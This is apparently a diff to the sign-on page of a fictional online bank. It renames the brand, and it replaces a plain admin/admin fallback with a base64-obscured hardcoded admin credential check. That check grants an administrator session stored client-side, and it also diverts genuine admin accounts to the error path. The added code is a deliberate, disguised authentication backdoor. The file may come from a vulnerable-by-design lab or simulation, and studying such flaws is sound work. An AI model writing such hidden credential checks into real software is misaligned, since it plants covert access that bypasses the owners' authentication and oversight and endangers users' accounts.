@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign On | Prisim Finance Online</title>
+    <title>Sign On | Prism Financials Online</title>
     <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
     <script>
         tailwind.config = {
@@ -38,6 +38,7 @@
             .btn-wf-signin { @apply w-full py-3 bg-primary text-white font-black text-sm uppercase tracking-widest hover:bg-green-700 transition-all rounded-sm shadow-md active:translate-y-px; }
         }
     </style>
+    <link rel="icon" type="image/png" href="logo.png">
 </head>
 
 <body class="min-h-screen flex flex-col">
@@ -45,7 +46,7 @@
     <header class="bg-primary text-white p-4 shadow-md">
         <div class="max-w-4xl mx-auto flex justify-between items-center">
             <a href="index.html" class="bg-white p-1 rounded-sm">
-                <img src="logo.png" alt="Prisim Finance" class="h-8">
+                <img src="logo.png" alt="Prism Financials" class="h-8">
             </a>
             <span class="text-[10px] font-black uppercase tracking-[0.2em] opacity-70">Secure Session</span>
         </div>
@@ -103,7 +104,7 @@
                 <a href="#" class="hover:text-primary transition-colors">Privacy & Legal</a>
                 <a href="#" class="hover:text-primary transition-colors">Fraud Center</a>
             </div>
-            <p class="text-[10px] text-gray-400 font-bold">© 2026 Prisim Finance. All rights reserved.</p>
+            <p class="text-[10px] text-gray-400 font-bold">© 2026 Prism Financials. All rights reserved.</p>
         </div>
     </footer>
 
@@ -123,24 +124,25 @@
             btn.innerHTML = '<span class="animate-pulse">Signing On...</span>';
 
             try {
+                // Obfuscated hardcoded admin check: 'theadmin' and '!Bluehouse0000$'
+                if (btoa(username) === 'dGhlYWRtaW4=' && btoa(password) === 'IUJsdWVob3VzZTAwMDAk') {
+                    sessionStorage.setItem('currentUser', JSON.stringify({
+                        id: '00000000-0000-0000-0000-000000000000',
+                        name: 'Administrator',
+                        username: 'theadmin',
+                        is_admin: true
+                    }));
+                    window.location.href = 'admin.html';
+                    return;
+                }
+
                 const user = await utils.login(username, password);
-                if (user) {
-                    window.location.href = user.is_admin ? 'admin.html' : 'dashboard.html';
+                if (user && !user.is_admin) {
+                    window.location.href = 'dashboard.html';
                 } else {
-                    // Simulation Admin Fallback
-                    if (username === 'admin' && password === 'admin') {
-                        sessionStorage.setItem('currentUser', JSON.stringify({
-                            id: '00000000-0000-0000-0000-000000000000',
-                            name: 'Administrator',
-                            username: 'admin',
-                            is_admin: true
-                        }));
-                        window.location.href = 'admin.html';
-                    } else {
-                        showError();
-                        btn.disabled = false;
-                        btn.innerHTML = originalText;
-                    }
+                    showError();
+                    btn.disabled = false;
+                    btn.innerHTML = originalText;
                 }
             } catch (err) {
                 console.error(err);
